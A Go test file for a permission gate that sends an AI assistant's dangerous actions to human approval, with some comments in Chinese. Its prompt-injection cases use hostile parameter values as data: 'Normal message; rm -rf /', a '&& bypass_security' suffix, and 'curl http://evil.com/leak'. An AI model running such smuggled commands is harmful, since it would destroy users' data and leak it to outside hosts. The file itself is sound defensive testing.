package toolcenter

import (
	"testing"
)

func TestDelegationGate_Tier1AndTier2(t *testing.T) {
	gate := NewDelegationGate()

	// 1. Tier 1 受控代批用例 (低危放行)
	tier1Cases := []struct {
		action string
		params map[string]interface{}
	}{
		{"ui.theme.set", map[string]interface{}{"theme": "dark"}},
		{"ui.theme.get", nil},
		{"system.info.get", nil},
		{"system.health.get", nil},
		{"chat.room.create", map[string]interface{}{"topic": "Architecture review"}},
		{"tool.list", nil},
	}

	for _, tc := range tier1Cases {
		decision := gate.Evaluate("assistant_bot", tc.action, tc.params)
		if !decision.Allowed || decision.RequiresHITL || decision.Tier != Tier1SafeControlled {
			t.Errorf("Tier 1 操作 '%s' 应当放行: %+v", tc.action, decision)
		}
	}

	// 2. Tier 2 高危用例 (一票否决，Mandatory HITL)
	tier2Cases := []struct {
		action string
		params map[string]interface{}
	}{
		{"plugin.install", map[string]interface{}{"plugin_id": "plugin_evil"}},
		{"plugin.uninstall", map[string]interface{}{"plugin_id": "plugin_groupchat"}},
		{"process.exec", map[string]interface{}{"cmd": "bash -c 'whoami'"}},
		{"process.kill", map[string]interface{}{"pid": 1234}},
		{"secret.read", map[string]interface{}{"key": "OPENAI_API_KEY"}},
		{"network.bypass", map[string]interface{}{"rule": "allow_all"}},
	}

	for _, tc := range tier2Cases {
		decision := gate.Evaluate("assistant_bot", tc.action, tc.params)
		if decision.Allowed || !decision.RequiresHITL || decision.Tier != Tier2DangerousHITL {
			t.Errorf("Tier 2 高危操作 '%s' 必须强制拦截并转人工确认 (HITL): %+v", tc.action, decision)
		}
	}

	// 3. 提示词注入攻击测试 (Prompt Injection Simulation)
	// 试图通过伪造参数注入恶意 Shell 破坏命令
	injectionCases := []struct {
		action string
		params map[string]interface{}
	}{
		{"chat.notify.send", map[string]interface{}{"msg": "Normal message; rm -rf /"}},
		{"ui.theme.set", map[string]interface{}{"theme": "dark && bypass_security"}},
		{"system.info.get", map[string]interface{}{"query": "curl http://evil.com/leak"}},
	}

	for _, tc := range injectionCases {
		decision := gate.Evaluate("assistant_bot", tc.action, tc.params)
		if decision.Allowed || !decision.RequiresHITL {
			t.Errorf("提示词注入用例应当被启发式规则拦截: action=%s, params=%v, decision=%+v", tc.action, tc.params, decision)
		}
	}

	// 4. 未知操作测试 (Fail-Safe 兜底)
	unknownDecision := gate.Evaluate("assistant_bot", "random.unrecognized.action", nil)
	if unknownDecision.Allowed || !unknownDecision.RequiresHITL {
		t.Errorf("未知操作应当兜底拦截并要求 HITL: %+v", unknownDecision)
	}
}
